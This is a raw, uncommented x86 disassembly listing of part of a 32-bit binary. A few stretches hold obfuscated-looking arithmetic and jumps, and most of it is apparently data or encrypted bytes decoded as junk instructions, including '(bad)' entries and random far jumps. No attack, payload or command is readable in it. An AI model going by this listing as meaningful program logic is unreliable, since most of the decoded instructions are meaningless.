  40d24e:	in     eax,0xb0
  40d250:	shl    DWORD PTR [ecx],1
  40d252:	or     eax,0x50624b39
  40d257:	sub    BYTE PTR [edx-0x65],al
  40d25a:	les    ebp,FWORD PTR [ecx]
  40d25c:	das    
  40d25d:	clc    
  40d25e:	mov    BYTE PTR [esi+ecx*1],al
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	push   ds
  40d2f3:	loopne 0x40d330
  40d2f5:	mov    esi,0x1818e22d
  40d2fa:	rcl    BYTE PTR [eax+ebx*1],cl
  40d2fd:	sbb    BYTE PTR [ecx+0x3e],ch
  40d300:	test   al,0xf6
  40d302:	jns    0x40d2a7
  40d304:	mov    cl,BYTE PTR [ebx]
  40d306:	das    
  40d307:	in     eax,dx
  40d308:	nop
  40d309:	idiv   DWORD PTR [esi-0x7b]
  40d30c:	(bad)  
  40d30d:	sub    ebx,DWORD PTR [edi-0x1f]
  40d310:	lods   al,BYTE PTR ds:[esi]
  40d311:	pop    edi
  40d312:	popf   
  40d313:	icebp  
  40d314:	je     0x40d2a4
  40d316:	xor    BYTE PTR [edi-0x2b6e3c43],dl
  40d31c:	lea    edi,[eax]
  40d31e:	sub    DWORD PTR [ecx+0x46],ebx
  40d321:	add    ah,BYTE PTR [ecx+0x15bb9c9f]
  40d327:	popa   
  40d328:	cmc    
  40d329:	cmp    eax,0x2dd37183
  40d32e:	retf   0x7dea
  40d331:	cmp    BYTE PTR [eax-0x55ccf03d],ch
  40d337:	stos   BYTE PTR es:[edi],al
  40d338:	dec    ebx
  40d339:	into   
  40d33a:	test   al,0x59
  40d33c:	ja     0x40d313
  40d33e:	mov    ah,0xe
  40d340:	push   cs
  40d341:	cdq    
  40d342:	xchg   ebx,eax
  40d343:	shl    DWORD PTR [edx-0x7f],cl
  40d346:	nop
  40d347:	mov    dh,0xd6
  40d349:	and    bh,cl
  40d34b:	sbb    al,0x3c
  40d34d:	xchg   DWORD PTR [ecx-0x10a493ab],eax
  40d353:	lahf   
  40d354:	mov    bl,0x8e
  40d356:	dec    edx
  40d357:	jmp    0x5838:0x6d8b9bec
  40d35e:	je     0x40d373
  40d360:	arpl   di,di
  40d362:	pop    ebx
  40d363:	mov    edx,DWORD PTR ds:0xbe184d0d
  40d369:	dec    esp
  40d36a:	sbb    esi,esp
  40d36c:	sti    
  40d36d:	adc    esi,DWORD PTR [ebp+0x63]
  40d370:	mov    esp,DWORD PTR [ecx-0x72]
  40d373:	inc    edx
  40d374:	jo     0x40d33a
  40d376:	aas    
  40d377:	ds ins BYTE PTR es:[edi],dx
  40d379:	test   eax,0x838ecdfc
  40d37e:	loop   0x40d3e6
  40d380:	inc    eax
  40d381:	je     0x40d3c9
  40d383:	jecxz  0x40d3d1
  40d385:	bound  ecx,QWORD PTR [eax+0x26]
  40d388:	add    edi,DWORD PTR [edi-0x541e188d]
  40d38e:	push   edi
  40d38f:	in     al,dx
  40d390:	popa   
  40d391:	lahf   
  40d392:	xchg   DWORD PTR [edi+0x22abc666],ecx
  40d398:	jmp    0x40d360
  40d39a:	enter  0xf02d,0x58
  40d39e:	xchg   ebp,eax
  40d39f:	stos   BYTE PTR es:[edi],al
  40d3a0:	retf   0x88b2
  40d3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3a4:	pop    edi
  40d3a5:	aaa    
  40d3a6:	cmp    bl,BYTE PTR [bx+si+0x12]
  40d3aa:	dec    edi
  40d3ab:	mov    al,ds:0x1df962bb
  40d3b0:	(bad)  
  40d3b1:	add    DWORD PTR [eax],esp
  40d3b3:	xor    DWORD PTR [edx+0x4c],ecx
  40d3b6:	mov    bh,0x97
  40d3b8:	adc    eax,0xab387e4a
  40d3bd:	mov    edx,0x50d1ab39
  40d3c2:	add    esp,ebx
  40d3c4:	and    DWORD PTR [ecx-0x64],ebx
  40d3c7:	push   ebp
  40d3c8:	pop    edx
  40d3c9:	add    DWORD PTR fs:[edx+0x6d],eax
  40d3cd:	(bad)  
  40d3cf:	mov    dl,0x2
  40d3d1:	jnp    0x40d440
  40d3d3:	test   al,0xb1
  40d3d5:	gs mov ch,0x3c
  40d3d8:	ins    BYTE PTR es:[edi],dx
  40d3d9:	inc    esp
  40d3da:	pop    edi
  40d3db:	call   0xe1d7:0x6b61f1e1
  40d3e2:	mov    ebp,0xa6efb58
  40d3e7:	pop    edi
  40d3e8:	cwde   
  40d3e9:	lods   al,BYTE PTR ds:[esi]
  40d3ea:	push   ebp
  40d3eb:	jno    0x40d456
  40d3ed:	vorps  xmm0,xmm1,XMMWORD PTR [edx+0x29]
  40d3f2:	ror    DWORD PTR [esi],0x28
  40d3f5:	mov    cl,0xc6
  40d3f7:	inc    ebx
  40d3f8:	dec    ecx
  40d3f9:	scas   al,BYTE PTR es:[edi]
  40d3fa:	iretw  
  40d3fc:	leave  
  40d3fd:	ins    BYTE PTR es:[edi],dx
  40d3fe:	mov    bl,0xe2
  40d400:	fs lock loopne 0x40d481
  40d404:	cdq    
  40d405:	pop    esi
  40d406:	push   ecx
  40d407:	and    al,0x66
  40d409:	pop    ebx
  40d40a:	stos   BYTE PTR es:[edi],al
  40d40b:	dec    edx
  40d40c:	jp     0x40d41f
  40d40e:	sbb    ch,bh
  40d410:	adc    eax,0xbe832638
  40d415:	iret   
  40d416:	nop
  40d417:	mov    ecx,0x32a0177a
  40d41c:	inc    ecx
  40d41d:	inc    edi
  40d41e:	mov    dh,0x0
  40d420:	push   ds
  40d421:	and    dh,BYTE PTR ds:0x4a3dfd24
  40d427:	xlat   BYTE PTR ds:[ebx]
  40d428:	jle    0x40d42f
  40d42a:	outs   dx,BYTE PTR ds:[esi]
  40d42b:	mov    ecx,esp
  40d42d:	je     0x40d41b
  40d42f:	jmp    0x34cc:0x4246e8aa
  40d436:	mov    al,0x2a
  40d438:	loope  0x40d41b
  40d43a:	lock or bh,bh
  40d43d:	jo     0x40d403
  40d43f:	mov    bl,0x4a
  40d441:	ret    
  40d442:	imul   ecx,DWORD PTR [esi],0xffffffca
  40d445:	inc    esp
  40d446:	xor    eax,0x5509d999
  40d44b:	enter  0x8880,0x99
  40d44f:	and    DWORD PTR [ebx],0x15bbcc70
  40d455:	mov    ch,0x40
  40d457:	or     ecx,ecx
  40d459:	mov    DWORD PTR [edx-0x34bafd1],esp
  40d45f:	jmp    0x40d446
  40d461:	stos   DWORD PTR es:[edi],eax
  40d462:	mov    al,0xdc
  40d464:	jecxz  0x40d429
  40d466:	dec    DWORD PTR [esi+0x56f2e7be]
  40d46c:	(bad)  
  40d46d:	scas   eax,DWORD PTR es:[edi]
  40d46e:	jbe    0x40d499
  40d470:	push   edi
  40d471:	fmulp  st(6),st
  40d473:	loope  0x40d42e
  40d475:	lds    esi,FWORD PTR [edx-0x6af3cf70]
  40d47b:	push   edx
  40d47c:	dec    edi
  40d47d:	retf   
  40d47e:	clc    
  40d47f:	cld    
  40d480:	jg     0x40d47b
  40d482:	js     0x40d49b
  40d484:	add    al,0x3d
  40d486:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d488:	mov    cl,0x84
  40d48a:	ins    DWORD PTR es:[edi],dx
  40d48b:	inc    ecx
  40d48c:	push   es
  40d48d:	imul   edx,DWORD PTR [eax+ecx*1],0xffffffc5
  40d491:	lods   al,BYTE PTR ds:[esi]
  40d492:	mov    ebp,DWORD PTR [edx]
  40d494:	dec    ebp
  40d495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d496:	push   edi
  40d497:	mov    ebp,0x2c7b12f0
  40d49c:	and    al,0x48
  40d49e:	in     al,dx
  40d49f:	mov    edx,0xf9a63e00
  40d4a4:	arpl   WORD PTR ds:0x6da2c7de,bx
  40d4aa:	(bad)  
  40d4ab:	sub    cl,BYTE PTR ds:0xa819ee06
  40d4b1:	cmp    DWORD PTR [edi+0x3145c1a6],0x19
  40d4b8:	add    eax,0xbf365c66
  40d4bd:	aam    0x54
  40d4bf:	cwde   
  40d4c0:	push   0x72
  40d4c2:	mov    al,ds:0x8b5e788
  40d4c7:	enter  0xfd27,0x22
  40d4cb:	ror    edx,cl
  40d4cd:	(bad)  
  40d4cf:	add    dl,BYTE PTR [esi+0x1aee0541]
  40d4d5:	cwde   
  40d4d6:	leave  
  40d4d7:	jnp    0x40d473
  40d4d9:	sar    BYTE PTR [ecx],0xaf
  40d4dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4dd:	rcr    DWORD PTR [ebx+0x20cc6031],cl
  40d4e3:	fwait
  40d4e4:	test   BYTE PTR [ecx+0x35e927c6],al
  40d4ea:	pushf  
  40d4eb:	cmp    eax,0x2500716f
  40d4f0:	mov    dl,0x33
  40d4f2:	mov    ?,WORD PTR [edx-0x6e]
  40d4f5:	retf   0x8393
  40d4f8:	sub    ah,BYTE PTR [esi+edx*1]
  40d4fb:	mov    ds:0xa155df93,al
  40d500:	scas   eax,DWORD PTR es:[edi]
  40d501:	not    BYTE PTR [ecx-0x76]
  40d504:	pop    ecx
  40d505:	fldcw  WORD PTR [eax+ebp*8-0x13]
  40d509:	loopne 0x40d544
  40d50b:	pop    ecx
  40d50c:	(bad)  
  40d50d:	cmp    ebp,DWORD PTR [eax]
  40d50f:	ficomp WORD PTR [eax]
  40d511:	and    edx,DWORD PTR [ecx+0x130cecc6]
  40d517:	xor    al,0x4d
  40d519:	and    eax,ebx
  40d51b:	mov    cl,0x61
  40d51d:	dec    ecx
  40d51e:	not    dl
  40d520:	dec    ecx
  40d521:	mov    edi,0x25f63bb2
  40d526:	mov    eax,ds:0xbe67839
  40d52b:	pop    ss
  40d52c:	adc    al,0xbf
  40d52e:	add    cl,0xe4
  40d531:	jmp    FWORD PTR [eax-0x62]
  40d534:	lods   al,BYTE PTR ds:[esi]
  40d535:	and    eax,0x6f082eeb
  40d53a:	mov    bl,0x7e
  40d53c:	cld    
  40d53d:	adc    al,0x6
  40d53f:	fild   QWORD PTR [edi]
  40d541:	pop    esp
  40d542:	adc    bl,BYTE PTR ds:0x8322ed95
  40d548:	pusha  
  40d549:	in     eax,dx
  40d54a:	lock cmp eax,0xf2c2eb64
  40d550:	cs out 0xee,eax
  40d553:	shr    BYTE PTR [edi-0x72a9546a],1
  40d559:	nop
  40d55a:	jle    0x40d5d9
  40d55c:	(bad)  
  40d55d:	(bad)  
  40d55e:	push   edx
  40d55f:	imul   esp,DWORD PTR ds:[ebx+0x77],0x6c
  40d564:	inc    ebp
  40d565:	mov    edi,0x3c45d396
  40d56a:	push   edx
  40d56b:	fs cwde 
  40d56d:	xchg   DWORD PTR [ebx-0x65d7903],ecx
  40d573:	xchg   ebp,eax
  40d574:	inc    edi
  40d575:	push   ecx
  40d576:	ds xor eax,0xee586c59
  40d57c:	and    eax,0xe34d34ab
  40d581:	test   dl,0xba
  40d584:	dec    eax
  40d585:	out    dx,eax
  40d586:	dec    eax
  40d587:	test   BYTE PTR [ebp+0xba96c29],bh
  40d58d:	pop    esp
  40d58e:	pop    edi
  40d58f:	mov    bl,0xfb
  40d591:	jle    0x40d54a
  40d593:	pop    ebp
  40d594:	dec    esi
  40d595:	pop    ss
  40d596:	xor    DWORD PTR [eax],ebx
  40d598:	(bad)
  40d59d:	stos   BYTE PTR es:[edi],al
  40d59e:	imul   esi,DWORD PTR [esi],0x3d
  40d5a1:	mov    dl,BYTE PTR [ebx]
  40d5a3:	fdivr  DWORD PTR [ebx+ecx*4+0x4d]
  40d5a7:	loopne 0x40d5dc
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	gs retf 0xbefe
  40d5bf:	out    0xdc,eax
  40d5c1:	sbb    BYTE PTR [eax],bl
  40d5c3:	rcl    BYTE PTR [eax+ebx*1],cl
  40d5c6:	sbb    BYTE PTR [eax-0x340746ee],dl
  40d5cc:	pop    ecx
  40d5cd:	dec    ebx
  40d5ce:	jnp    0x40d629
  40d5d0:	pushf  
  40d5d1:	xor    eax,esi
  40d5d3:	xchg   ebp,eax
  40d5d4:	push   0x38
  40d5d6:	fcom   DWORD PTR [ebx-0x70]
  40d5d9:	sub    dh,dl
  40d5db:	int3   
  40d5dc:	pop    esi
  40d5dd:	fdivr  QWORD PTR fs:[edi+0x79]
  40d5e1:	push   edi
  40d5e2:	test   ebx,edx
  40d5e4:	lahf   
  40d5e5:	mov    DWORD PTR [edx+esi*8],esi
  40d5e8:	(bad)
  40d5ec:	cli    
  40d5ed:	test   eax,0x68ef0698
  40d5f2:	xor    esp,esi
  40d5f4:	retf   
  40d5f5:	mov    esp,0x7ef3c0a1
  40d5fa:	inc    esi
  40d5fb:	clc    
  40d5fc:	and    DWORD PTR [edx-0x71],edi
  40d5ff:	loopne 0x40d61b
  40d601:	inc    ebx
  40d602:	dec    ebx
  40d603:	enter  0x2a53,0x5e
  40d607:	lock hlt 
  40d609:	shl    ecx,cl
  40d60b:	cmp    eax,0xea0feced
  40d610:	pop    ebx
  40d611:	int    0x87
  40d613:	sub    BYTE PTR [edi-0x7b],cl
  40d616:	ins    DWORD PTR es:[edi],dx
  40d617:	cmp    BYTE PTR [ebp+0xe23d5ba],bl
  40d61d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d61e:	sub    ch,BYTE PTR [ebp-0x5e]
  40d621:	dec    eax
  40d622:	dec    ebp
  40d623:	sbb    al,BYTE PTR [ecx]
  40d625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d626:	mov    BYTE PTR [ecx],cl
  40d628:	sar    BYTE PTR [eax+esi*8],cl
  40d62b:	jne    0x40d646
  40d62d:	xchg   esp,eax
  40d62e:	mov    cl,0x21
  40d630:	pusha  
  40d631:	inc    esp
  40d632:	cmp    al,0x7a
  40d634:	adc    BYTE PTR gs:[eax+0x752256f0],bl
  40d63b:	idiv   bl
  40d63d:	dec    ebx
  40d63e:	xchg   ebp,eax
  40d63f:	inc    eax
  40d640:	jmp    0x60bf:0xfcc9cc45
  40d647:	scas   eax,DWORD PTR es:[edi]
  40d648:	scas   eax,DWORD PTR es:[edi]
  40d649:	stos   DWORD PTR es:[edi],eax
  40d64a:	bound  esi,QWORD PTR ds:0x5b4da10a
  40d650:	call   0x784b:0x2228dcb7
  40d657:	sar    BYTE PTR [edx-0x2c57d371],0xd3
  40d65e:	inc    edx
  40d65f:	leave  
  40d660:	psubw  mm4,QWORD PTR [ebx]
  40d663:	imul   BYTE PTR [ecx-0x60c1e0dc]
  40d669:	pushf  
  40d66a:	aam    0x33
  40d66c:	es in  al,dx
  40d66e:	gs mov cl,0x43
  40d671:	inc    esp
  40d672:	int    0x58
  40d674:	sub    DWORD PTR [ecx-0x5c],ecx
  40d677:	stos   BYTE PTR es:[edi],al
  40d678:	jecxz  0x40d5fb
  40d67a:	es cmp al,0x69
  40d67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d67e:	push   cs
  40d67f:	hlt    
  40d680:	in     al,0x36
  40d682:	dec    esi
  40d683:	aas    
  40d684:	aaa    
  40d685:	or     edi,eax
  40d687:	sub    dl,dh
  40d689:	pop    ss
  40d68a:	inc    ecx
  40d68b:	jp     0x40d62e
  40d68d:	pop    esi
  40d68e:	ror    DWORD PTR [ebp+ebx*4+0x76],cl
  40d692:	mov    ebp,0xcf719384
  40d697:	sbb    al,0x2d
  40d699:	imul   ecx,DWORD PTR gs:[esi],0x1080cb81
  40d6a0:	or     al,0x82
  40d6a2:	push   edx
  40d6a3:	pop    edx
  40d6a4:	ss stos DWORD PTR es:[edi],eax
  40d6a6:	ins    BYTE PTR es:[edi],dx
  40d6a7:	xor    dl,dh
  40d6a9:	out    dx,al
  40d6aa:	xchg   ebx,eax
  40d6ab:	push   ecx
  40d6ac:	add    al,0xb7
  40d6ae:	ins    BYTE PTR es:[edi],dx
  40d6af:	mov    al,ds:0x133386f4
  40d6b4:	mov    bh,0xa4
  40d6b6:	dec    edx
  40d6b7:	adc    DWORD PTR [esp+edx*4],ebp
  40d6ba:	cwde   
  40d6bb:	pop    ebp
  40d6bc:	shl    DWORD PTR [ecx+0x47],cl
  40d6bf:	cwde   
  40d6c0:	mov    ebx,0x2ea2d1f8
  40d6c5:	sub    BYTE PTR [edi],bh
  40d6c7:	sti    
  40d6c8:	icebp  
  40d6c9:	jmp    0x40d66c
  40d6cb:	xor    edx,edi
  40d6cd:	fwait
  40d6ce:	(bad)  
  40d6cf:	js     0x40d66a
  40d6d1:	out    0x93,al
  40d6d3:	int3   
  40d6d4:	lds    eax,FWORD PTR [ebx-0x406046c1]
  40d6da:	jb     0x40d6d4
  40d6dc:	sbb    eax,0x27ad548f
  40d6e1:	rol    BYTE PTR [esi+0x5b664d64],1
  40d6e7:	out    0x29,eax
  40d6e9:	push   esp
  40d6ea:	mov    al,0x86
  40d6ec:	xor    edi,DWORD PTR [esi]
  40d6ee:	pop    ecx
  40d6ef:	inc    ebp
  40d6f0:	out    0xba,eax
  40d6f2:	fwait
  40d6f3:	add    BYTE PTR [esi-0xea9a179],0x58
  40d6fa:	mov    al,ds:0x1fc248fc
  40d6ff:	xchg   DWORD PTR [edi],edi
  40d701:	aaa    
  40d702:	retf   0xd203
  40d705:	cmp    DWORD PTR [esi-0x64a1810b],ecx
  40d70b:	lahf   
  40d70c:	std    
  40d70d:	je     0x40d6a0
  40d70f:	xor    DWORD PTR [ebx-0x777c0617],edi
  40d715:	push   es
  40d716:	ret    0xe22e
  40d719:	jne    0x40d6f0
  40d71b:	xchg   esi,eax
  40d71c:	fld    DWORD PTR [edi]
  40d71e:	js     0x40d757
  40d720:	pop    edx
  40d721:	loope  0x40d6d3
  40d723:	or     al,0x72
  40d725:	push   esp
  40d726:	aas    
  40d727:	outs   dx,BYTE PTR ds:[esi]
  40d728:	sub    edi,DWORD PTR [eax-0x4d]
  40d72b:	mov    dl,0x71
  40d72d:	cmc    
  40d72e:	test   ebx,ebx
  40d730:	push   es
  40d731:	test   al,0xdb
  40d733:	ds xchg esp,eax
  40d735:	stc    
  40d736:	js     0x40d7b6
  40d738:	ss lock pop edi
  40d73b:	sub    al,0x9d
  40d73d:	push   0x72
  40d73f:	mov    edx,0x6d1456c4
  40d744:	and    ebp,DWORD PTR [ebx]
  40d746:	push   0xb0fa0d8f
  40d74b:	in     eax,dx
  40d74c:	test   ah,ch
  40d74e:	stos   BYTE PTR es:[edi],al
  40d74f:	mov    ah,0xf7
  40d751:	sbb    al,0x9a
  40d753:	lahf   
  40d754:	mov    ds:0xf5c39332,eax
  40d759:	aam    0x78
  40d75b:	retf   0x44e3
  40d75e:	clc    
  40d75f:	enter  0xcb28,0xb2
  40d763:	push   ecx
  40d764:	clc    
  40d765:	fldcw  WORD PTR [esi+0x17921cc8]
  40d76b:	or     bl,BYTE PTR [ecx-0x30]
  40d76e:	out    dx,eax
  40d76f:	dec    esi
  40d770:	and    DWORD PTR [ebp+0x551ee235],0x4adc1409
  40d77a:	mov    ecx,0xa52ae96f
  40d77f:	test   al,0xd8
  40d781:	dec    eax
  40d782:	add    DWORD PTR [edi+0x2a27d795],ecx
  40d788:	cdq    
  40d789:	cmp    ah,bh
  40d78b:	and    edi,esp
  40d78d:	push   esp
  40d78e:	dec    edx
  40d78f:	sbb    eax,0x9d6677ce
  40d794:	scas   eax,DWORD PTR es:[edi]
  40d795:	or     bh,BYTE PTR [eax+0x77a81e6a]
  40d79b:	mov    edx,0x5642b464
  40d7a0:	fimul  DWORD PTR [ecx-0x798a8ce1]
  40d7a6:	push   es
  40d7a7:	dec    edi
  40d7a8:	xchg   esi,eax
  40d7a9:	jb     0x40d72d
  40d7ab:	std    
  40d7ac:	push   es
  40d7ad:	pushw  0x24
  40d7b0:	mov    ds:0x7c8c5857,al
  40d7b5:	pop    ds
  40d7b6:	fidivr WORD PTR [esi]
  40d7b8:	(bad)  
  40d7b9:	push   esi
  40d7ba:	or     DWORD PTR [edx+edi*8],ebp
  40d7bd:	xor    ebp,DWORD PTR [ebp+ebp*8-0x77]
  40d7c1:	sbb    DWORD PTR [eax],ebx
  40d7c3:	fbstp  TBYTE PTR [ecx-0x52]
  40d7c6:	addr16 lock cld 
  40d7c9:	jmp    0xbb74:0x7f3f0c86
  40d7d0:	in     eax,0x58
  40d7d2:	mov    dl,0xc5
  40d7d4:	add    bh,ch
  40d7d6:	inc    eax
  40d7d7:	not    BYTE PTR [esi-0xe]
  40d7da:	inc    esi
  40d7db:	mov    edi,DWORD PTR [eax+0x1e715fc1]
  40d7e1:	inc    edx
  40d7e2:	pop    eax
  40d7e3:	inc    ecx
  40d7e4:	inc    ebp
  40d7e5:	inc    ebp
  40d7e6:	sbb    ebp,DWORD PTR [edx+edx*8-0x63]
  40d7ea:	mov    eax,ds:0xf5aeac0f
  40d7ef:	iret   
  40d7f0:	loop   0x40d798
  40d7f2:	dec    edi
  40d7f3:	sti    
  40d7f4:	das    
  40d7f5:	retf   0xf5ee
  40d7f8:	sub    al,0xcb
  40d7fa:	shrd   DWORD PTR [ebp+0xb],ecx,0xaf
  40d7ff:	pop    ebx
  40d800:	sub    DWORD PTR [esi-0x79070f2a],0x13cd7d9f
  40d80a:	bound  ecx,QWORD PTR [edi+0x6f]
  40d80d:	adc    cl,BYTE PTR ds:0xd3383a19
  40d813:	inc    eax
  40d814:	dec    ebx
  40d815:	push   ecx
  40d816:	(bad)  
  40d817:	lods   eax,DWORD PTR ds:[esi]
  40d818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d819:	and    bl,BYTE PTR [edx]
  40d81b:	sub    eax,0x8fca212
  40d820:	mov    BYTE PTR [ecx-0x30],ah
  40d823:	cdq    
  40d824:	sti    
  40d825:	cli    
  40d826:	repnz dec edi
  40d828:	ins    BYTE PTR es:[edi],dx
  40d829:	or     edi,DWORD PTR [edi]
  40d82b:	adc    al,0xb8
  40d82d:	xor    eax,ebp
  40d82f:	sub    bl,al
  40d831:	sahf   
  40d832:	lds    esp,FWORD PTR [edx]
  40d834:	inc    edi
  40d835:	or     al,0xdb
  40d837:	add    eax,0x894f0317
  40d83c:	cmp    bl,BYTE PTR [edx+0x6fab4c63]
  40d842:	sbb    eax,0x41e6f642
  40d847:	shr    BYTE PTR [eax+ebx*4],cl
  40d84a:	test   DWORD PTR [esi-0x62ad1002],0xded939a
  40d854:	int3   
  40d855:	pop    es
  40d856:	ja     0x40d80e
  40d858:	mov    edi,0xe41758a
  40d85d:	jecxz  0x40d85b
  40d85f:	sbb    ch,BYTE PTR [ebx+eax*1+0x3e]
  40d863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d864:	icebp  
  40d865:	dec    eax
  40d866:	adc    ah,BYTE PTR [ebx-0x4cf5fbb3]
  40d86c:	int3   
  40d86d:	ret    
  40d86e:	mov    edi,0x4db5
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xd737febc
  40d894:	mov    esp,0x1818d8a0
  40d899:	rcl    BYTE PTR [eax+ebx*1],cl
  40d89c:	sbb    al,ch
  40d89e:	gs adc esp,ecx
  40d8a1:	push   ecx
  40d8a2:	pusha  
  40d8a3:	stc    
  40d8a4:	enter  0x2ba0,0xb6
  40d8a8:	pop    esp
  40d8a9:	pop    eax
  40d8aa:	or     DWORD PTR [ecx],esi
  40d8ac:	mov    cl,0xc6
  40d8ae:	test   edi,esi
  40d8b0:	or     BYTE PTR [ebx-0x4c],al
  40d8b3:	xchg   edi,eax
  40d8b4:	add    al,0x81
  40d8b6:	jmp    0x9e4e:0x516a7239
  40d8bd:	(bad)  
  40d8be:	mov    esp,0x43cb7840
  40d8c3:	mul    BYTE PTR [ebp+edx*2+0xe]
  40d8c7:	mov    WORD PTR [ebp-0x5b0a96f0],ds
  40d8cd:	imul   ecx,DWORD PTR [edi-0x7f],0xffffffe0
  40d8d1:	in     eax,0x98
  40d8d3:	ins    BYTE PTR es:[edi],dx
  40d8d4:	pushf  
  40d8d5:	push   ebp
  40d8d6:	push   edi
  40d8d7:	add    BYTE PTR [edi*1-0xccbe39b],bh
  40d8de:	nop
  40d8df:	jae    0x40d906
  40d8e1:	pop    ecx
  40d8e2:	dec    edi
  40d8e3:	inc    edi
  40d8e4:	sbb    DWORD PTR [ebp-0x66411537],0x1066af48
  40d8ee:	cdq    
  40d8ef:	jp     0x40d893
  40d8f1:	pushf  
  40d8f2:	push   ebx
  40d8f3:	xor    al,BYTE PTR [esp+ebp*1+0xd]
  40d8f7:	lea    edx,[ecx+eiz*1+0x158a4e6d]
  40d8fe:	xor    esp,ebp
  40d900:	lock mov DWORD PTR [edi-0x26de5b05],ebx
  40d907:	pop    esi
  40d908:	je     0x40d927
  40d90a:	shr    DWORD PTR [edx+edi*4],1
  40d90d:	leave  
  40d90e:	sub    al,0xa9
  40d910:	jb     0x40d8b6
  40d912:	jmp    0x40d89d
  40d914:	mov    cl,0x24
  40d916:	xor    ah,BYTE PTR [ecx-0x3af67933]
  40d91c:	test   BYTE PTR [eax+0x7511008b],ah
  40d922:	int3   
  40d923:	das    
  40d924:	loopne 0x40d98d
  40d926:	mov    eax,ds:0xcbd1b4d3
  40d92b:	adc    ebx,ebx
  40d92d:	sbb    BYTE PTR [esi],bl
  40d92f:	clc    
  40d930:	mov    ah,0xc8
  40d932:	cmc    
  40d933:	lea    ecx,[ebp-0x68]
  40d936:	pop    edx
  40d937:	cld    
  40d938:	(bad)  
  40d939:	jbe    0x40d8c1
  40d93b:	in     al,dx
  40d93c:	je     0x40d919
  40d93e:	push   ds
  40d93f:	retf   
  40d940:	daa    
  40d941:	hlt    
  40d942:	push   ds
  40d943:	lods   al,BYTE PTR ds:[esi]
  40d944:	push   0xffffff8f
  40d946:	lods   al,BYTE PTR ds:[esi]
  40d947:	mov    es:0xa14bc1ab,al
  40d94d:	push   edi
  40d94e:	in     al,dx
  40d94f:	jmp    0x2fa3:0x37ca7336
  40d956:	and    bh,BYTE PTR [ebx]
  40d958:	outs   dx,DWORD PTR ds:[esi]
  40d959:	(bad)  
  40d95a:	dec    ecx
  40d95b:	and    BYTE PTR [ecx-0x3b],0x5c
  40d95f:	mov    al,ds:0xc69a94cd
  40d964:	hlt    
  40d965:	or     BYTE PTR [esi+0xa],0xd2
  40d969:	jb     0x40d9a3
  40d96b:	mov    ds:0xb10d51db,eax
  40d970:	inc    edx
  40d971:	mov    bl,0xd3
  40d973:	out    0x36,al
  40d975:	add    esi,esp
  40d977:	loopne 0x40d960
  40d979:	push   0xe9444095
  40d97e:	mov    ds:0xb5fe8f22,eax
  40d983:	ins    DWORD PTR es:[edi],dx
  40d984:	stos   BYTE PTR es:[edi],al
  40d985:	(bad)  
  40d986:	xor    ebp,esi
  40d988:	adc    BYTE PTR [edi],ch
  40d98a:	std    
  40d98b:	dec    esi
  40d98c:	lea    ecx,[ebx+0x24]
  40d98f:	push   edi
  40d990:	iret   
  40d991:	mov    eax,0xfe6a861
  40d996:	xor    ah,BYTE PTR [ecx+0x6]
  40d999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d99a:	xor    eax,0x8f1de97a
  40d99f:	pop    eax
  40d9a0:	mov    esi,0x76717f6e
  40d9a5:	dec    edi
  40d9a6:	adc    eax,0xf4cb3613
  40d9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ac:	push   eax
  40d9ad:	xlat   BYTE PTR ds:[ebx]
  40d9ae:	je     0x40d9c7
